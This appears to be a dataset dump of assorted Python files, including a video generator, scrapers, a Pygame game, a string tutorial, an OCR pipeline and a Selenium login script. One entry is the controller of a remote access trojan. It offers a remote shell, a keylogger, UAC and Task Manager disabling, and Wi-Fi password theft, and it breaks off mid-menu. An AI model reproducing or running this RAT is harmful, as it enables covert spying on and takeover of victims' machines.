generate_voice(translateto(text,get_language_code(language)),\"temp/\"+str(i)+\".mp3\",get_language_code(language))\n        print(\"speech make\")\n        videos.append(resize_and_text(\"temp/\"+str(i)))\n        i+=1\n\n    final_video = concatenate_videoclips(videos)\n    audio_clip = AudioFileClip(\"temp/song.mp3\")\n    if final_video.duration < audio_clip.duration:\n        audio_clip = audio_clip.subclip(0, final_video.duration)\n\n    adjusted_audio_clip = CompositeAudioClip([audio_clip.volumex(0.12),final_video.audio])\n    final_video = final_video.set_audio(adjusted_audio_clip)\n    final_video.write_videofile(\"short.mp4\", audio_codec='aac')\n\n    if os.path.exists(\"temp.txt\"):\n        os.remove(\"temp.txt\")\n    if os.path.exists(\"temp\") and os.path.isdir(\"temp\"):\n        shutil.rmtree(\"temp\")\n        print(f\"Directory temp deleted successfully.\")\n    else:\n        print(f\"Directory temp not found.\")\n    sys.exit()\n",
    "import requests\r\nimport json\r\nimport time\r\nimport threading\r\nc=time.time()\r\nclass Count_Replies:\r\n    def __init__(self):\r\n        self.data=self.get_data()\r\n\r\n    def get_max_id(self):\r\n        w=requests.get(\"https://api.codemao.cn/web/work-shops/search?limit=1&sort=-created_at\")\r\n        data=json.loads(w.text)\r\n        return data[\"items\"][0][\"id\"]\r\n\r\n    def get_data(self):\r\n        n=self.get_max_id()\r\n        lst=[]\r\n        num = min(200,n)\r\n        link_range_list = [(int(i * (n) / num), -1+int((1 + i) * (n) / num)) for i in range(num)]\r\n        # print(link_range_list)\r\n\r\n        thread_list = []\r\n        for i in range(1, num + 1):\r\n            thread = myThread(\"Thread-\" + str(i), link_range_list[i - 1])\r\n            thread.start()\r\n            thread_list.append(thread)\r\n        # print(len(thread_list))\r\n        for i in thread_list:\r\n            i.join()\r\n        flag=all([i.flag for i in thread_list])\r\n        while not flag:\r\n            flag = all([i.flag for i in thread_list])\r\n        for i in thread_list:\r\n            lst+=i.lst\r\n        # print(lst)\r\n        # print(len(lst))\r\n        return lst\r\n    def show_list(self):\r\n        lst=[[i[\"all\"],i[\"name\"],i[\"id\"]] for i in self.data]\r\n        lst.sort()\r\n        lst=lst[::-1]\r\n        return lst\r\nclass myThread(threading.Thread):\r\n    def __init__(self, name, link_range):\r\n        threading.Thread.__init__(self)\r\n        self.name = name\r\n        self.link_range = link_range\r\n        self.lst = []\r\n        self.flag=False\r\n\r\n    def run(self):\r\n        # print(\"Starting\" + self.name)\r\n        self.crawler(self.name, self.link_range)\r\n        # print(\"Exiting\" + self.name)\r\n\r\n    def crawler(self, link_num, link_range):\r\n        self.lst=[]\r\n        for i in range(link_range[0],link_range[1]+1):\r\n            # if link_num==\"Thread-1\":\r\n                # print(i/len(link_range))\r\n            l={}\r\n            try:\r\n                w = requests.get(f\"https://api.codemao.cn/web/shops/{i}\")\r\n                l[\"name\"] = json.loads(w.text)[\"name\"]\r\n            except:\r\n                continue\r\n            w=requests.get(f\"https://api.codemao.cn/web/discussions/{i}/comments?source=WORK_SHOP&limit=5&offset=0\")\r\n            data = json.loads(w.text)\r\n            l[\"reply\"]=data[\"total\"]#\u8bc4\u8bba\r\n            l[\"all\"]=data[\"totalReply\"]+data[\"total\"]#\u603b\u6570\uff0c\u5305\u62ec\u8bc4\u8bba\u56de\u590d\r\n            l[\"id\"]=i\r\n            self.lst.append(l)\r\n        self.flag=True\r\n\r\nif __name__==\"__main__\":\r\n    count=Count_Replies()\r\n\r\n    print(count.show_list())#[\u6570\u91cf,\u540d\u79f0,\u5de5\u4f5c\u5ba4id]\r\n\r\n    print(time.time()-c)\r\n",
    "## Making Alien Invasion Game using Pygame\n\n\n# Starting the game\n\nimport sys\nimport pygame\n\nfrom settings import Settings\nfrom Ship_Class import Ship\nfrom Bullet_Class import Bullet\nfrom alien import Alien\n\n\nclass Alien_Invasion:\n    \"\"\"main class to manage the game assests and behaviour\"\"\"\n\n\n    #constructor\n    def __init__(self):\n        pygame.init()\n        self.settings = Settings()\n        self.screen = pygame.display.set_mode((self.settings.screen_w,self.settings.screen_h))\n        pygame.display.set_caption(\"Alien Invasion\")\n        self.ship =Ship(self)\n        #bullets\n        self.bullets = pygame.sprite.Group()\n\n        #aliens\n        self.aliens = pygame.sprite.Group()\n        self._create_fleet()\n\n\n\n\n    def run_game(self):\n        # main loop\n        while True:\n            #watch for the events\n            self._check_events()\n            self.ship.update()\n            self._update_bullets()\n            self._update_aliens()\n            self._update_screen()\n\n\n\n    def _check_events(self):\n        # responds to keypress\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                sys.exit()\n            elif(event.type == pygame.KEYDOWN ):\n                self._check_keydown_events(event)\n            elif(event.type ==pygame.KEYUP):\n                self._check_keyup_events(event)\n\n\n    def _check_keydown_events(self,event):\n        if (event.key == pygame.K_RIGHT):\n            self.ship.moving_right = True\n        elif (event.key == pygame.K_LEFT):\n            self.ship.moving_left = True\n        elif(event.key == pygame.K_UP):\n            self.ship.moving_top = True\n        elif(event.key == pygame.K_DOWN):\n            self.ship.moving_bottom = True\n        elif(event.key == pygame.K_SPACE):\n            self._fire_bullet()\n        elif(event.key == pygame.K_q):\n                sys.exit()\n\n    def _check_keyup_events(self,event):\n        if (event.key == pygame.K_RIGHT):\n            self.ship.moving_right = False\n        elif (event.key == pygame.K_LEFT):\n            self.ship.moving_left = False\n        elif (event.key == pygame.K_UP ):\n            self.ship.moving_top = False\n        elif (event.key == pygame.K_DOWN):\n            self.ship.moving_bottom = False\n\n\n    # updating bullets method\n    def _update_bullets(self):\n        self.bullets.update()\n        # getting rid of old bullets so that the system did not get slow\n        for bullet in self.bullets.copy():\n            if bullet.rect.bottom <= 0:\n                self.bullets.remove(bullet)\n\n    #bullet firing\n    def _fire_bullet(self):\n        # create a new bullet and add it to the bullets group\n        if(len(self.bullets) < self.settings.bullets_allowed):\n            new_bullet = Bullet(self)\n            self.bullets.add(new_bullet)\n\n\n\n\n    #update screen method\n    def _update_screen(self):\n        self.screen.fill(self.settings.bg_color)\n        self.ship.biltime()\n\n        for bullet in self.bullets.sprites():\n            bullet.draw_bullet()\n        self.aliens.draw(self.screen)\n        pygame.display.flip()\n\n\n    # Alien Creation\n    def _create_fleet(self):\n        # creating the fleet of the aliens\n        alien = Alien(self)\n        alien_width , alien_height = alien.rect.size\n        available_space_x = self.settings.screen_w -(2*alien_width)\n        number_aliens_x = available_space_x // (2*alien_width)\n\n        ship_height = self.ship.rect.height\n        available_space_y = (self.settings.screen_h - (3*alien_height) - ship_height)\n        number_rows = available_space_y // (2 * alien_height)\n        for row_number in range(number_rows):\n            for alien_number in range(number_aliens_x):\n                self._create_alien(alien_number,row_number)\n\n\n    def _create_alien(self,alien_number,row_number):\n        alien = Alien(self)\n        alien_width,alien_height = alien.rect.size\n        alien_x = alien_width + 2 * alien_width * alien_number\n        alien.rect.x = alien_x\n        alien.rect.y = alien_height + 2 * alien.rect.height * row_number\n        self.aliens.add(alien)\n\n\n    def _update_aliens(self):\n        self.aliens.update()\n\nif __name__ == '__main__':\n    ai = Alien_Invasion()\n    ai.run_game()",
    "'''\nQ : What is a string?\nAns : A string which enclose in double and single quotes . The string contains alphanumeric and number values.\nUse Case :- String is used to create patterns\n'''\nstr1 = \"      The python consist of many useful libraries for Data Science\"\n# to find the length of the string\nprint(len(str1))\n# to find the word in sentence\n# Difference find vs index\n# Ans :- find will give -1 if not found but index give an error message\nprint(str1.find(\"python\",20)) # taking a offest as a second argument\nprint(str1.index(\"python\"))\n# to check the characters\nprint(str1[len(str1)-2])\n# to remove whitespace\nprint(\"The length with whitespace is : {}\".format(len(str1)))\nnewstr = str1.strip()\nprint(\"The length without whitespace is : {}\".format(len(newstr)))\n# format function\na = \"watermelon\"\nb = \"mango\"\nc = \"litchi\"\n# format is used to print the variable in the string\nres = \"{} , {} and {} are summer fruits\".format(a,b,c)\n#Q : Print Mango and Watermelon in terminal\nres1 = \"{1} and {0}\".format(a,b)\nprint(res1)\n# fstring\nres2 = f\"{b} and {c} are my favorite fruits\"\nprint(res2)\n# slicing ? = it is used to cut a part of the string\nsl_str = res2[0:10]\nprint(sl_str)\n# lowercase and uppercase\nprint(res2.capitalize() + \" = Captilize\")\nprint(res2.lower() + \" = lower\")\nprint(res2.upper() + \" = upper\")\nprint(res2.title() + \" = title\")\nprint(res2.center(130))\n# Split function : it will break the string into array or list\ncity = \"Delhi|Mumbai|Agra|chennai|Punjab|Haryana\"\nspl = res2.split(\" \")\nspl2 = city.split(\"|\")\nprint(spl2)\nstr2 = \"Good Evening\"\nstr2 = str2.replace(\"Evening\",\"morning\")\nprint(str2)\nprint(str2.startswith(\"Good\"))\nprint(str2.endswith(\"Evening\"))",
    "#!/usr/bin/env python3\n\nimport sys\nimport json\nimport re\nimport argparse\nimport os\nfrom colorama import Fore, Style\n\n\ndef is_process_event(event):\n    return \"exec\" in event\n\n\ndef match_pattern(name, pattern):\n    return (pattern is None) or re.search(name, pattern)\n\n\ndef filter_eslogger(name_pattern, show_child_process=False):\n    pid_set = set()\n\n    for line in sys.stdin:\n        try:\n            data = json.loads(line)\n            event = data[\"event\"]\n            process = data[\"process\"]\n            pid = process[\"parent_audit_token\"][\"pid\"] if is_process_event(event) else process[\"audit_token\"][\"pid\"]\n            executable_path = process[\"executable\"][\"path\"]\n            executable_name = os.path.basename(executable_path)\n\n            if (pid not in pid_set) and (not match_pattern(executable_name, name_pattern)):\n                continue\n\n            print(f'{Fore.GREEN}{executable_name}({pid}){Style.RESET_ALL} ', end=\"\")\n\n            if \"exec\" in event:\n                child_pid = event[\"exec\"][\"target\"][\"audit_token\"][\"pid\"]\n\n                if show_child_process:\n                    pid_set.add(child_pid)\n\n                args = event[\"exec\"][\"args\"]\n                print(f'[EXEC]({child_pid}) {\" \".join(args)}')\n            elif \"open\" in event:\n                print(f'[OPEN] {event[\"open\"][\"file\"][\"path\"]}')\n            elif \"write\" in event:\n                print(f'[WRITE] {event[\"write\"][\"target\"][\"path\"]}')\n            elif \"create\" in event:\n                print(f'[CREATE] {event[\"create\"][\"destination\"][\"existing_file\"][\"path\"]}')\n\n        except json.JSONDecodeError:\n            print(f\"Failed to parse JSON: {line.strip()}\")\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(\n        usage=\"sudo eslogger exec [open write ...] | %(prog)s [options]\",\n        description=\"Filter the output of `eslogger` to only show cared processes and information.\",\n        epilog=\"\"\"\nexamples:\n  Monitor all the processes spawned by Xcode and related process:\n    sudo eslogger exec | eslogger-filter.py --name=\"(Xcode|XCBBuildService|SourceKitService|com.apple.dt.SKAgent)\" --show-child-process\n\n  Monitor open files by Slack\n    sudo eslogger open | eslogger-filter.py --name=\"Slack\" --show-child-process\n\nFor more information about `eslogger`, please refer to `man eslogger`.\n        \"\"\",\n        formatter_class=argparse.RawDescriptionHelpFormatter,\n    )\n    parser.add_argument(\"-n\", \"--name\", type=str, required=False,\n                        help=\"Regex pattern for matching process names. Omitting this will log all processes.\")\n    parser.add_argument(\"-c\", \"--show-child-process\", action=\"store_true\",\n                        help=\"Include child processes of the processes matched by --name.\")\n    args = parser.parse_args()\n\n    try:\n        filter_eslogger(args.name, args.show_child_process)\n    except KeyboardInterrupt:\n        sys.exit(0)\n",
    "from bs4 import BeautifulSoup\nimport requests\nimport random\nimport os\nuser_agents = [\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'\n    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'\n    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'\n    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'\n    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15'\n    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15'\n    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'\n]\n# import time\n\n\n\nHEADERS = ({'User-Agent' : random.choice(user_agents),\n            'Accepted-Language' : 'en-US, en;q=0.5'})\ndef general(soup,filename):\n    \n    all_text = soup.get_text()\n    \n    #q+=1\n    lines = all_text.splitlines()\n    with open(filename, 'w') as file:\n        for string in lines:\n            file.write(string + '\\n')\n    print(\"Completed the file - \\n\",filename)\n\n\ndef blog(link,filename):\n    \n    code_elements = link.find_all('CodeMirror-code')\n    with open(filename, 'w') as file:\n        for code_element in code_elements:\n            code_text = code_element.get_text()\n            file.write(code_text + '\\n')\n    print(\"Completed the file - \\n\",filename)\n\n\ndef freeCode(link,filename):\n    \n    #code_elements = bs.find_all('code', class_='language-css')\n    code_elements = link.find_all('code')\n    with open(filename, 'w') as file:\n        for code_element in code_elements:\n            code_text = code_element.get_text()\n            file.write(code_text + '\\n')\n    print(\"Completed the file - \\n\",filename)\n\ndef programiz(link,filename):\n    # filename=\"programiz.txt\"\n    #code_elements = bs.find_all('code', class_='language-css')\n    code_elements = link.find_all('code')\n    with open(filename, 'w') as file:\n        for code_element in code_elements:\n            code_text = code_element.get_text()\n            file.write(code_text + '\\n')\n    print(\"Completed the file - \\n\",filename)\n\ndef w3(link,filename):\n    # filename=\"w3.txt\"\n    code_content= link.find_all('div',attrs={'class':'w3-example'})\n    with open(filename, 'w') as file:\n        for c in code_content:\n            code_text = c.get_text()\n            file.write(code_text + '\\n')\n    print(\"Completed the file - \\n\",filename)\n\ndef gfg(link,filename):\n    # filename=\"gfg.txt\"\n    td_snips = link.find_all('td',attrs={'class':'code'})\n    if td_snips:\n        with open(filename, 'w') as file:\n            for t in td_snips:\n                code_text = t.get_text()\n                file.write(code_text + '\\n')\n        print(\"Completed the file - \\n\",filename)  \n    else:\n        code_elements = link.find_all('code')\n        with open(filename, 'w') as file:\n            for t in code_elements:\n                code_text = t.get_text()\n                file.write(code_text + '\\n')\n        print(\"Completed the file - \\n\",filename) \n\ndef happycoding(link,filename):\n    # filename=\"happycoding.txt\"\n    code_content= link.find_all('div',{'class':'language-java highlighter-rouge'})\n    with open(filename, 'w') as file:\n        for c in code_content:\n            code_text = c.get_text()\n            file.write(code_text + '\\n')\n    print(\"Completed the file - \\n\",filename)  \n\n\n\ndef get_code(str):\n       \n        str = str.replace(\" \",\"+\")\n        URL = \"https://www.google.com/search?q=\"\n\n        URL += str\n        print(URL)\n\n        webpage = requests.get(URL,headers=HEADERS) \n\n        soup = BeautifulSoup(webpage.content, 'html.parser')\n\n        links = soup.find_all('a',attrs={'jsname' : 'UWckNb'})\n\n        answers = []\n\n        for l in links:\n            page_href = l['href']\n            answers.append(page_href) \n            \n            \n        for a in answers:\n            link_to_open = a\n\n            \n            print(\"Opening link:\", link_to_open)\n            html_response = requests.get(link_to_open, headers=HEADERS)\n            #time.sleep(5)\n            bs = BeautifulSoup(html_response.content, 'html.parser')\n\n            if \"freecodecamp\" in link_to_open:\n                filename = os.path.join('submissions', 'testdir', 'freecodecamp.txt')\n                freeCode(bs,filename)\n\n            elif \"w3schools\" in link_to_open:\n                # filename=a[12:16] + '.txt'\n                filename = os.path.join('submissions', 'testdir', 'w3schools.txt')\n                w3(bs,filename)\n            \n            elif \"blog.hubspot\" in link_to_open:\n                # filename=a[12:16] + '.txt'\n                filenam",
    "import os\nfrom .normalizer import normalize\nfrom .classifier import classify\nfrom .reader import read\nimport cv2\nimport os\nimport logging\nimport time\nimport re\n\nlogging.basicConfig(filename='cv/work.log', \n                    filemode='a', \n                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', \n                    level=logging.INFO)\n\ndef get_logger(name):\n    return logging.getLogger(name)\n\ndef main(doc, normalizer_model, classifier_model, text_model, debugging, reader, launch_type='windows'):\n    start_time = time.time()\n\n    logger = get_logger('core')\n    logger.info('started')\n    \n    if launch_type == 'linux':\n        os.environ['TESSDATA_PREFIX'] = 'tesseract/tessdata'\n    \n    processing = cv2.imread(os.path.join(os.getcwd(), doc))\n\n    # document outline prediction\n    results = normalizer_model.predict(processing, verbose=False, save=debugging, conf=0.65)\n\n\n    # fix/transform image\n    try:\n        warped = normalize(processing, results, launch_type=launch_type)\n    except TypeError:\n        logger.info('[core] failed to normalize, using default image')\n        warped = processing\n    \n\n    # classify document type\n    doc_class, percentages = classify(warped, model=classifier_model, launch_type=launch_type)\n    try:\n        type_, page_number_ = doc_class.split('_')\n    except: type_, page_number_ = doc_class, 0\n    type_ = {'pass':'personal_passport', 'pts':'vehicle_passport', 'sts':'vehicle_certificate', 'vu':'driver_license'}[type_]\n    confidence_ = percentages[doc_class] / 100\n\n    # rotate image\n    rotation = {'personal_passport': 'horizontal', 'vehicle_passport': 'vertical', 'vehicle_certificate': 'vertical', 'driver_license': 'horizontal'}\n    required_orientation = rotation[type_]\n    \n    height, width = warped.shape[:2]\n    current_orientation = \"vertical\" if height > width else \"horizontal\"\n    if current_orientation != required_orientation:\n        if current_orientation == \"horizontal\" and required_orientation == \"vertical\":\n            rotated_image = cv2.rotate(warped, cv2.ROTATE_90_CLOCKWISE)\n        elif current_orientation == \"vertical\" and required_orientation == \"horizontal\":\n            rotated_image = cv2.rotate(warped, cv2.ROTATE_90_COUNTERCLOCKWISE)\n    else:\n        rotated_image = warped\n\n    def process_string(s):\n        letters = re.findall(r'[\u0410-\u042f\u0430-\u044fA-Za-z]', s)\n        \n        if len(letters) == 1:\n            return re.sub(r'[\u0410-\u042f\u0430-\u044fA-Za-z]', '', s)\n        return s\n    \n    res__ = []\n    for res in res__:\n        res__.append(process_string(res))\n\n   # read data\n    res_ = read(rotated_image, text_model, reader)\n    res__ = []\n    for res in res_:\n        pattern = r'[^a-zA-Z\u0430-\u044f\u0410-\u042f0-9]+'\n        cleaned_res = re.sub(pattern, '', res)\n\n        letters_count = sum(c.isalpha() for c in cleaned_res)\n        if letters_count == 1:\n            res__.append(''.join(filter(str.isdigit, cleaned_res)))\n        else:\n            res__.append(cleaned_res)\n    \n    res_ = max(res__, key=len)\n\n    try:\n        series_, number_ = res_[:4], res_[4:]\n    except IndexError: return {'error': 'failed to find serial or number on document'}\n\n    end_time = time.time()\n    elapsed_time = (end_time - start_time) * 1000\n    if debugging: logging.info(f'[core] done in {elapsed_time} ms')\n    logging.info('[core] finished')\n\n\n    return {\n        'type': type_,\n        'confidence': float(\"{:.2f}\".format(confidence_)),\n        'series': series_,\n        'number': number_,\n        'page_number': page_number_\n    }\n",
    "import socket\r\nimport os\r\nimport time\r\nimport random\r\n\r\nclass RAT_SERVER:\r\n    def __init__(self, host, port):\r\n        self.host = host\r\n        self.port = port\r\n    \r\n    def build_connection(self):\r\n        global client, addr, s\r\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        s.bind((self.host, self.port))\r\n        s.listen(5)\r\n        print(\"\\033[31m\")  # Red color escape sequence\r\n        print(\"\u2800 \uff0fl\u3001\")\r\n        print(\"\uff08\uff9f\uff64 \uff61 \uff17\")\r\n        print(\"\u2800l\u3001\uff9e ~\u30fd\")\r\n        print(\"\u2004\u2004\u3058\u3057f_, )\u30ce):\")\r\n        print(\"\\033[0m\")  # Reset color escape sequence\r\n        print(\"[*] Waiting for the client...\")\r\n        while True:\r\n            try:\r\n                client, addr = s.accept()\r\n                break\r\n            except:\r\n                print(\"\\033[H\\033[J\")\r\n                print(\"[*] Waiting for the client \" + self.loading_animation())\r\n                time.sleep(0.1)\r\n        print()\r\n        ipcli = client.recv(1024).decode()\r\n        print(f\"[*] Connection is established successfully with {ipcli}\")\r\n        print()\r\n    \r\n    def loading_animation(self):\r\n        animation = \"|/-\\\\\"\r\n        for i in range(20):\r\n            time.sleep(0.1)\r\n            print(\"\\033[F\", end=\"\")\r\n            print(\"\\033[K\", end=\"\")\r\n            print(\"[\" + animation[i % len(animation)] + \"]\", end=\"\")\r\n        return \"\"\r\n    \r\n    def server(self):\r\n        try:\r\n            from vidstream import StreamingServer\r\n            global server\r\n            server = StreamingServer(self.host, 8080)\r\n            server.start_server()\r\n        except:\r\n            print(\"Module not found...\")\r\n    \r\n    def stop_server(self):\r\n        server.stop_server()\r\n    \r\n    def result(self):\r\n        client.send(command.encode())\r\n        result_output = client.recv(1024).decode()\r\n        print(result_output)\r\n    \r\n    def banner(self):\r\n        print(\"======================================================\")\r\n        print(\"                       Commands                       \")\r\n        print(\"======================================================\")\r\n        print(\"System: \")\r\n        print(\"======================================================\")\r\n        print(f'''\r\nhelp                      all commands available\r\nwritein <text>            write the text to current opened window\r\nbrowser                   enter quiery to browser\r\nturnoffmon                turn off the monitor\r\nturnonmon                 turn on the monitor\r\nreboot                    reboot the system\r\ndrivers                   all drivers of PC\r\nkill                      kill the system task\r\nsendmessage               send messagebox with the text\r\ncpu_cores                 number of CPU cores\r\nsysteminfo (extended)     all basic info about system (via cmd)\r\ntasklist                  all system tasks\r\nlocaltime                 current system time\r\ncurpid                    PID of client's process\r\nsysinfo (shrinked)        basic info about system (Powers of Python)\r\nshutdown                  shutdown client's PC\r\nisuseradmin               check if user is admin\r\nextendrights              extend system rights\r\ndisabletaskmgr            disable Task Manager\r\nenabletaskmgr             enable Task Manager\r\ndisableUAC                disable UAC\r\nmonitors                  get all used monitors\r\ngeolocate                 get location of computer\r\nvolumeup                  increase system volume to 100%\r\nvolumedown                decrease system volume to 0%\r\nsetvalue                  set value in registry\r\ndelkey                    delete key in registry\r\ncreatekey                 create key in registry\r\nsetwallpaper              set wallpaper\r\nexit                      terminate the session of RAT\r\n''')\r\n        print(\"======================================================\")\r\n        print(\"Shell: \")\r\n        print(\"======================================================\")\r\n        print(f'''\r\npwd                       get current working directory\r\nshell                     execute commands via cmd\r\ncd                        change directory\r\n[Driver]:                 change current driver\r\ncd ..                     change directory back\r\ndir                       get all files of current directory\r\nabspath                   get absolute path of files\r\n''')\r\n        print(\"======================================================\")\r\n        print(\"Network: \")\r\n        print(\"======================================================\")\r\n        print(f'''\r\nipconfig                  local ip\r\nportscan                  port scanner\r\nprofiles                  network profiles\r\nprofilepswd               password for profile\r\n''')\r\n        print(\"======================================================\")\r\n        print(\"Input devices: \")\r\n        print(\"======================================================\")\r\n        print(f'''\r\nkeyscan_start             start keylogger\r\nsend_logs                 send captured keystrokes\r\nstop_keylogger            stop keylogger\r\n",
    "# -*- coding: utf-8 -*-\nfrom selenium import webdriver\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.common.action_chains import ActionChains\n# ActionChains(driver).key_down(Keys.CONTROL).click(lnk).key_up(Keys.CONTROL).perform()\nfrom pyvirtualdisplay import Display\nimport time\nimport logger\nimport sys,os\nimport json\nimport requests\nimport threading\nfrom queue import Queue\n\nimport webthread\n\n__g_logger = logger.Logger()\n\ndef isNeedDisplay(bMustVirtualDisplay=1):\n    if (r\"linux\" in sys.platform):\n        if (bMustVirtualDisplay):\n            return 1\n        else:\n            return 2\n    return 2\n\n\ndef pushmsg(push_token,title,content):\n    if(push_token==''):return ''\n    url='https://iyuu.cn/'+push_token+'.send?text=%s&desp=%s'%(title,content)\n        \n    data = {\n            \"token\":push_token,\n            \"title\":title,\n            \"content\":content\n        }    \n    body=json.dumps(data).encode(encoding='utf-8')\n    headers = {'Content-Type':'application/json'}\n    ret=requests.post(url,data=body,headers=headers)\n    return ret.text\n\n\ndef keepalive_ctyun2(parms,url=\"https://pc.ctyun.cn/#/login\"):\n    __g_logger.setModulename(\"keepalive_ctyun\")\n    if (parms is None):\n        __g_logger.warning(\"Wrong parameters parms\")\n        return -1\n        \n    ctyun_steps=[{\"name\":\"login Input\",\"elems\":[['account',By.CLASS_NAME,'send_keys','%ACCOUNT%'],\n                                               ['password',By.CLASS_NAME,'send_keys','%CTPASSWORD%'],\n                                               ['btn-submit',By.CLASS_NAME,'click','3']]}\n                ,{\"name\":\"Enter YunMachine\",\"elems\":[['desktop-main-entry',By.CLASS_NAME,'click','5']]}\n                ,{\"name\":\"Windows login\",\"elems\":[['screenContainer',By.CLASS_NAME,'click','15'],\n                                                 ['winpassword',\"active_element\",'send_keys','%WINPASSWORD%']]}\n                ]\n    for step in ctyun_steps:\n        for elem in step['elems']:\n            if(elem[3] ==\"%ACCOUNT%\"):\n                elem[3]=parms['account']\n            elif(elem[3] ==\"%CTPASSWORD%\"):\n                elem[3]=parms['password']\n            elif(elem[3] ==\"%WINPASSWORD%\"):\n                elem[3]='999'+parms['password']\n    #print(ctyun_steps)\n            \n    if(parms['browserType'] =='edge'):\n        options = webdriver.EdgeOptions() #ChromeOptions()\n        options.use_chromium=True\n    else:\n        options = webdriver.ChromeOptions()\n        \n    isDisplay =  isNeedDisplay()\n    if (isDisplay==1):\n        display = Display(visible=False, size=(480, 600))\n        display.start()\n        options.add_argument('excludeSwitches=enable-automation')\n        options.add_argument('blink-settings=imagesEnabled=false')  # \u4e0d\u52a0\u8f7d\u56fe\u7247, \u63d0\u5347\u901f\u5ea6\n    elif(isDisplay==2): #normal Linux none-interface mode\n        options.add_argument('--no-sandbox')  # \u89e3\u51b3DevToolsActivePort\u6587\u4ef6\u4e0d\u5b58\u5728\u7684\u62a5\u9519\n        options.add_argument('window-size=800x600')  # \u6307\u5b9a\u6d4f\u89c8\u5668\u5206\u8fa8\u7387\n        options.add_argument('--disable-gpu')  # \u8c37\u6b4c\u6587\u6863\u63d0\u5230\u9700\u8981\u52a0\u4e0a\u8fd9\u4e2a\u5c5e\u6027\u6765\u89c4\u907fbug\n        options.add_argument('--hide-scrollbars')  # \u9690\u85cf\u6eda\u52a8\u6761, \u5e94\u5bf9\u4e00\u4e9b\u7279\u6b8a\u9875\u9762\n        options.add_argument('blink-settings=imagesEnabled=true')  # \u4e0d\u52a0\u8f7d\u56fe\u7247, \u63d0\u5347\u901f\u5ea6\n        options.add_argument('--headless')  # \u6d4f\u89c8\u5668\u4e0d\u63d0\u4f9b\u53ef\u89c6\u5316\u9875\u9762. linux\u4e0b\u5982\u679c\u7cfb\u7edf\u4e0d\u652f\u6301\u53ef\u89c6\u5316\u4e0d\u52a0\u8fd9\u6761\u4f1a\u542f\u52a8\u5931\u8d25\n    else:\n        options.add_argument('blink-settings=imagesEnabled=false')  # \u4e0d\u52a0\u8f7d\u56fe\u7247, \u63d0\u5347\u901f\u5ea6\n    options.add_argument('permissions.default.stylesheet=2')    #\u4e0d\u7528\u7f51\u7ad9\u63d0\u4f9b\u7684css\n    options.add_argument('--enable-chrome-browser-cloud-management')\n\n    if(parms['listen_url'] == ''): listen_url=getDefaultUrl(port=parms['listenport'])\n    listen_url=f'<a href=\"{listen_url}\">\u70b9\u51fb\u8f93\u5165(click to input)</a>'\n\n    try:\n        if(parms['listenport']>0):\n            verifyCodeQueue=Queue()\n            webthread.web_run(verifyCodeQueue,port=parms['listenport'])   #\u62c9\u8d77\u4e00\u4e2aweb\u76d1\u542c\u7ebf\u7a0b\uff0c\u4fbf\u4e8e\u8f93\u5165\u9a8c\u8bc1\u7801\n\n        __g_logger.info(\"try start selenium\")\n        if(parms['browserType'] =='edge'):\n            options.binary_location='C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe' if (parms['browserPath']=='') else parms['browserPath']\n            driver = webdriver.Edge(options=options)\n        else:\n            options.binary_location='D:\\programs\\chrome\\chrome.exe' if (parms['browserPath']=='') else parms['browserPath']\n            driver = webdriver.Chrome(options=options)\n        driver.get(url)\n        time.sleep(3)\n        \n        i=0\n        while i<len(ctyun_steps):\n            step= ctyun_steps[i]\n            __g_logger.info(\"step\" + str(i+1) + \":\"+ step['name']+\",Now url:\" +driver.current_url)\n\n            if(driver.current_url == url):  #\u5f53\u524d\u4e3a\u767b\u5f55\u9875\u9762\uff0c\u9700\u8981\u989d\u5916\u5224\u65ad\u662f\u5426\u9700\u8981\u8f93\u5165\u9a8c\u8bc1\u7801\n                try:\n                    obj = driver.find_element(By.CLASS_NAME,'code')\n                    objimg = driver.find_element(By.CLASS_NAME,'code-img')\n                    if(obj.get_attribute('value')==''):\n                        __g_logger.warn(\"\u767b\u5f55\u9700\u8981\u9a8c\u8bc1",
    "import io\nimport json\nfrom faster_whisper import WhisperModel\nimport streamlit as st\n\n\n@st.cache_resource\ndef load_model():\n    return WhisperModel(\n        model_size_or_path=\"large-v3\",\n        device=\"cuda\",\n        compute_type=\"float16\"\n    )\n\n\nclass GenerateSubtitles:\n\n    def __init__(self):\n        self.model = None\n\n    def generate_automatic(self):\n\n        model = load_model()\n\n        segments, info = model.transcribe(\n            audio=\"temp/audio.mp3\",\n            beam_size=5,\n        )\n\n        data_segments = []\n\n        for segment in segments:\n            data_segments.append({\n                'start': segment.start,\n                'end': segment.end,\n                'text': segment.text\n            })\n\n        return data_segments\n\n    def generate_custom(self, len_segment: int):\n\n        model = load_model()\n\n        segments, info = model.transcribe(\n            audio=\"temp/audio.mp3\",\n            beam_size=5,\n            word_timestamps=True\n        )\n\n        data_words = []\n\n        for segment in segments:\n            for word in segment.words:\n                data_words.append({\n                    \"start\": word.start,\n                    \"end\": word.end,\n                    \"word\": word.word\n                })\n\n        text = \"\"\n        pos_start = 0\n\n        data_word_expanded = []\n\n        for index, data in enumerate(data_words):\n\n            if text == \"\":\n                pos_start = data[\"start\"]\n\n           